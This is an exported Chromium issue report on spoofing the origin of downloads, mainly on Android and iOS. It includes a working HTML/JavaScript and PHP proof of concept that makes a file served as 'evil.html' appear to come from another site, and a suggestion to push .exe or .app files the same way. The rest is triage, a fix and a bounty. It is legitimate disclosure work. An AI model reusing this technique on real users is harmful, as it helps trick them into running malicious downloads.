# Security: spoof download on any websites

| Field | Value |
|-------|-------|
| **Issue ID** | [40054142](https://issues.chromium.org/issues/40054142) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | UI>Browser>Downloads |
| **Platforms** | Android |
| **Reporter** | zy...@gmail.com |
| **Assignee** | qi...@chromium.org |
| **Created** | 2020-12-11 |
| **Bounty** | $2,500.00 |

## Description

UserAgent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36

Steps to reproduce the problem:
1.first open poc.html(e.g., visit from http://192.168.1.199)
```
<script>
    function next() {
            w.location.href="http://192.168.1.199/301.php";
          }

    function f() {
      w = window.open("");
      w.location = "https://abc.xyz"
      i = setInterval("try { x = w.location.href; } catch(e) { clearInterval(i); next(); }", 1)
    }
  </script>

  <a href="#" onclick="f()">click me</a>
```

content of 301.php
```
<?php
 header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="thisisfromgoogle.html"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: 13400');
    readfile('./evil.html');
">

2.click link "click me" and continue

What is the expected behavior?
show download sources origin in prompt

What went wrong?
victim will believe this file is from abc.xyz

Did this work before? N/A 

Chrome version: 89.0.4351.0  Channel: canary
OS Version: OS X 10.15.1
Flash Version:

## Attachments

- [android.jpg](attachments/android.jpg) (image/jpeg, 1.3 MB)
- [desktop.png](attachments/desktop.png) (image/png, 813.9 KB)
- [ios.jpg](attachments/ios.jpg) (image/jpeg, 352.4 KB)
- [WechatIMG66.jpeg](attachments/WechatIMG66.jpeg) (image/jpeg, 1.4 MB)

## Timeline

### zy...@gmail.com (2020-12-11)

this case maybe affects windows/mac/linux/android, also ios.

### [Deleted User] (2020-12-11)

[Empty comment from Monorail migration]

### wf...@chromium.org (2020-12-11)

Thanks for your report. Some initial triage.

[Monorail components: UI>Browser>Downloads]

### zy...@gmail.com (2020-12-16)

you can try to automaticly download .exe for PC ,.app for mac etc.

### zy...@gmail.com (2020-12-16)

And victim doesn't know where is the file from even if he clicks "Options"->"Downloads" in iOS.

### zy...@gmail.com (2020-12-16)

Android chrome also show a incorrect download origin in "Options"->"Downloads"


### ca...@chromium.org (2020-12-16)

jdeblasio: Can I use your recent experience with downloads as an excuse to ask for help finding a good owner for this? Thanks!

Assigning medium severity since this can only cause confusion in the download bar, not the whole page, and even then it just doesn't show an origin, not the wrong one.

### zy...@gmail.com (2020-12-16)

Thanks, this case maybe regard as intended behaviour on PC and Mac because victim can see real download origin in the file list at "chrome://downloads/"

But Android show an incorrect download origin "abc.xyz" instead of real origin"192.168.1.199", as I mentioned in https://crbug.com/chromium/1157743#c6

If you click "Options"->"Downloads" in iOS Chrome, chrome will open the download directory in iOS "files" app directly, so victim doesn't know this file is actually from "192.168.1.199" not "abc.xyz",as I mentioned in https://crbug.com/chromium/1157743#c5

### jd...@chromium.org (2020-12-16)

This sounds like two separate problems, to me:
 1. The Download origin displayed on Android doesn't match the correct origin (as displayed on Desktop).
 2. A site can generate a download that starts after another page has loaded.

The second problem is a long-running issue, and is being addressed in https://crbug.com/chromium/121259.

Let's use this bug to track the first problem (Android being wrong, and inconsistent with Desktop).

qinmin@: can you address the Android issue? This seems right up your alley. Thanks!

### [Deleted User] (2020-12-16)

Setting milestone and target because of Security_Impact=Stable and medium severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2020-12-16)

Setting Pri-1 to match security severity Medium. If this is incorrect, please reset the priority. Sheriffbot won't make this change again.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### qi...@chromium.org (2020-12-16)

[Comment Deleted]

### qi...@chromium.org (2020-12-16)

[Empty comment from Monorail migration]

### qi...@chromium.org (2020-12-16)

Android uses page URL on download home, working on a CL to fix this.

### [Deleted User] (2020-12-31)

qinmin: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mp...@google.com (2021-01-02)

[Empty comment from Monorail migration]

### mp...@google.com (2021-01-02)

cthomp@ and meacer@, this looks similar to https://crbug.com/chromium/1082129.

### bu...@chops-service-accounts.iam.gserviceaccount.com (2021-01-05)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/e48617b1409823326d7c698b3d6288036991441b

commit e48617b1409823326d7c698b3d6288036991441b
Author: Min Qin <qinmin@chromium.org>
Date: Tue Jan 05 19:18:26 2021

Fix an issue download shows page URL instead of origin

BUG=1157743

Change-Id: Ib6d78ada4e84935873b8968ba560ed9653bf6294
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2595526
Reviewed-by: Shakti Sahu <shaktisahu@chromium.org>
Commit-Queue: Min Qin <qinmin@chromium.org>
Cr-Commit-Position: refs/heads/master@{#840237}

[modify] https://crrev.com/e48617b1409823326d7c698b3d6288036991441b/chrome/browser/download/internal/android/java/src/org/chromium/chrome/browser/download/home/list/UiUtils.java


### qi...@chromium.org (2021-01-05)

[Empty comment from Monorail migration]

### [Deleted User] (2021-01-06)

[Empty comment from Monorail migration]

### [Deleted User] (2021-01-06)

[Empty comment from Monorail migration]

### [Deleted User] (2021-01-06)

This is sufficiently serious that it should be merged to beta. But I can't see a Chromium repo commit here, so you will need to investigate what - if anything - needs to be merged to M88. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2021-01-06)

This bug requires manual review: We are only 12 days from stable.
Before a merge request will be considered, the following information is required to be added to this bug:

1. Does your merge fit within the Merge Decision Guidelines?
- Chrome: https://chromium.googlesource.com/chromium/src.git/+/master/docs/process/merge_request.md#when-to-request-a-merge
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. Links to the CLs you are requesting to merge.
3. Has the change landed and been verified on ToT?
4. Does this change need to be merged into other active release branches (M-1, M+1)?
5. Why are these changes required in this milestone after branch?
6. Is this a new feature?
7. If it is a new feature, is it behind a flag using finch?

Chrome OS Only:
8. Was the change reviewed and approved by the Eng Prod Representative? See Eng Prod ownership by component: http://go/cros-engprodcomponents

Please contact the milestone owner if you have questions.
Owners: govind@(Android), bindusuvarna@(iOS), marinakz@(ChromeOS), srinivassista @(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### go...@chromium.org (2021-01-06)

+adetaylor@ (Security TPM) for M88 merge review. Thank you. 

### go...@chromium.org (2021-01-06)

Change listed at #18 is not in canary yet. 

### ad...@chromium.org (2021-01-07)

Very low-risk change; approving merge to M88, branch 4324.

### qi...@chromium.org (2021-01-08)

https://chromium-review.googlesource.com/c/chromium/src/+/2616958 landed

somehow crbug is not updated

### go...@chromium.org (2021-01-08)

[Empty comment from Monorail migration]

### ad...@google.com (2021-01-13)

[Empty comment from Monorail migration]

### [Deleted User] (2021-01-14)

[Empty comment from Monorail migration]

### am...@google.com (2021-01-19)

[Empty comment from Monorail migration]

### ja...@google.com (2021-01-20)

[Empty comment from Monorail migration]

### am...@google.com (2021-01-20)

Hi, cthomp@ and meacer@, just seeing mpdenton@'s comment in C#17 "this looks similar to https://crbug.com/chromium/1082129". Would either of you have a chance to validate if there is any overlap with similarity? 

### me...@chromium.org (2021-01-20)

As jdeblasio pointed in https://crbug.com/chromium/1157743#c9, there are two issues here.

- https://crbug.com/chromium/1082129 (and https://crbug.com/chromium/121259 which encompasses similar issues) is the #2 issue in https://crbug.com/chromium/1157743#c9.
- The fix at https://crbug.com/chromium/1157743#c19 is the fix for #1 issue in https://crbug.com/chromium/1157743#c9.

So I think the labels are correct and there is a valid issue & fix here (The Download origin displayed on Android doesn't match the correct origin).

### ad...@google.com (2021-01-21)

[Empty comment from Monorail migration]

### am...@google.com (2021-01-21)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@google.com (2021-01-21)

Congratulations, wester0x01- the VRP Panel has decided to award you $500 for this report! Nice work! 

### am...@google.com (2021-01-21)

[Empty comment from Monorail migration]

### as...@google.com (2021-01-27)

[Empty comment from Monorail migration]

### am...@google.com (2021-02-09)

[Empty comment from Monorail migration]

### [Deleted User] (2021-04-14)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### zy...@gmail.com (2021-04-20)

Him it's looks like this case still work on 90.0.4430.66, could you check it again if it is fixed?

### ad...@chromium.org (2021-04-20)

Reopening so qinmin@ can check out https://crbug.com/chromium/1157743#c42.

### [Deleted User] (2021-04-20)

qinmin: Uh oh! This issue still open and hasn't been updated in the last 101 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### qi...@chromium.org (2021-04-20)

There is another fix landed in M92. So need to try the latest canary to verify.

### [Deleted User] (2021-05-21)

This issue hasn't been updated in the last 30 days - please update it or consider lowering its priority.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2021-05-26)

[Empty comment from Monorail migration]

### [Deleted User] (2021-06-28)

This issue hasn't been updated in the last 30 days - please update it or consider lowering its priority.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### qi...@chromium.org (2021-06-28)

[Empty comment from Monorail migration]

### [Deleted User] (2021-10-04)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### am...@chromium.org (2021-12-01)

Hello, the VRP Panel has reassessed your report and has decided to increase your reward amount to $2500 for this report. Thank you for your patience while we reassessed this. 

### am...@google.com (2021-12-06)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/1157743?no_tracker_redirect=1

[Monorail mergedwith: crbug.com/chromium/1162593]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40054142)*
